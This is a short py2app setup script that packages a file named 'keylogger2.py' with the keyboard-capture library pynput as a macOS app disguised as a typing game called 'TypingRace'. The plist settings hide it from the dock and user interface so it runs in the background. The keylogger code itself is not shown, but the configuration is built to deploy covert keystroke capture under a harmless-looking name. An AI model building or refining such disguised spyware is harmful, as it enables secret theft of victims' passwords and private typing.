from setuptools import setup

APP = ['keylogger2.py']
OPTIONS = {
    # 'argv_emulation': True,
    'iconfile': 'icon.icns',
    'plist': {
        'CFBundleName': 'TypingRace',
        'CFBundleDisplayName': 'TypingRace',
        'CFBundleIdentifier': 'com.example.typingrace',
        'LSBackgroundOnly': True,
        'NSUIElement': True,
    },
    'packages': ['pynput'],
    # 'includes': ['keylogger2']
}

setup(
    app=APP,
    name='TypingRace',
    options={'py2app': OPTIONS},
    setup_requires=['py2app'],
)
